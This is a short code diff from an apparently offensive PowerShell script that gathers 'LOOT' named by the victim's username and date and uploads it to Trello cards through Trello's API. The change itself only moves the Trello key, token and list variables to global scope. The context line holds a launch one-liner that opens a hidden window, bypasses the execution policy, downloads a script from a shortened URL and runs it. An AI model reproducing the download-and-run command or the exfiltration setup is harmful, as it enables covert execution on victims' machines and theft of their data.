@@ -28,10 +28,9 @@ powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/wBFLV | iex
 #>
 
 # You need to changes those variables in the Upload-Trello function : 
-#$idList = ""
-#$key = ""
-#$token = ""
-
+$idList = ""
+$key = ""
+$token = ""
 
 # Function to handle the temporary directory
 function TempDir {
@@ -78,9 +77,6 @@ function Upload-Trello{
     
 # Replace the following values with your own
 $name = "${username}_LOOT_${dateSansHeure}"
-$idList = ""
-$key = ""
-$token = ""
 
 # URL de l'API Trello pour créer une carte
 $url = "https://api.trello.com/1/cards"
